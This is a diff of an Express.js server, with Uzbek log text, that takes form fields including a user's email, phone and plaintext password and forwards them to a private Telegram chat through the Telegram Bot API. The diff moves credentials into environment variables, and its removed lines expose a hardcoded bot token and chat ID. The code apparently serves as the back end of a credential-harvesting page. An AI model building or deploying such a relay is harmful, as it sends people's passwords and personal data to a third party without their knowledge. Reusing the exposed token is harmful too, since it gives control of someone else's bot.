@@ -1,31 +1,35 @@
 import express from "express";
 import cors from "cors";
+import dotenv from "dotenv";
+
+dotenv.config();
 
 const app = express();
 
 app.use(cors());
 app.use(express.json());
 
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
 
-// BOT TOKENNI @BotFather dan yangisini ol
-const BOT_TOKEN = "8645256830:AAFWxWplA4DbEJa9nYDc4E6BHYTOL_h8u3I";
-const CHAT_ID = "8585388313";
+if (!BOT_TOKEN || !CHAT_ID) {
+    console.error("BOT_TOKEN yoki CHAT_ID topilmadi");
+    process.exit(1);
+}
 
+app.post("/sendMessage", async (req, res) => {
+    try {
+        const {
+            name,
+            surname,
+            className,
+            email,
+            phone,
+            password,
+            passwordLevel,
+        } = req.body;
 
-app.post("/sendMessage", async (req,res)=>{
-
-    const {
-        name,
-        surname,
-        className,
-        email,
-        phone,
-        password,
-        passwordLevel
-    } = req.body;
-
-
-    const text = `
+        const text = `
 🆕 Yangi foydalanuvchi
 
 👤 Ism: ${name || "-"}
@@ -36,76 +40,50 @@ app.post("/sendMessage", async (req,res)=>{
 
 📱 Telefon: ${phone || "-"}
 
-🔐 Parol: ${password}
+🔐 Parol: ${password || "-"}
 
-⚡ Daraja: ${passwordLevel}
-    `;
-
-
-    try{
-
+⚡ Daraja: ${passwordLevel || "-"}
+`;
 
         const tg = await fetch(
-        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-        {
-
-            method:"POST",
-
-            headers:{
-                "Content-Type":"application/json"
-            },
-
-            body:JSON.stringify({
-
-                chat_id:CHAT_ID,
-
-                text:text
-
-            })
-
-        });
-
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+            {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text,
+                }),
+            }
+        );
 
         const data = await tg.json();
 
-
-        console.log(data);
-
-
-
-        if(!data.ok){
-
-            return res.status(400).json(data);
-
+        if (!data.ok) {
+            return res.status(400).json({
+                success: false,
+                telegram: data,
+            });
         }
 
-
-
         res.json({
-            success:true
+            success: true,
+            telegram: data,
         });
-
-
-
-    }catch(err){
-
-        console.log(err);
+    } catch (err) {
+        console.error(err);
 
         res.status(500).json({
-            success:false
+            success: false,
+            message: err.message,
         });
-
     }
-
-
 });
 
+const PORT = process.env.PORT || 3001;
 
-
-app.listen(3001,()=>{
-
-console.log(
-"Telegram server 3001 ishladi"
-);
-
+app.listen(PORT, () => {
+    console.log(`✅ Server ${PORT} portda ishlayapti`);
 });
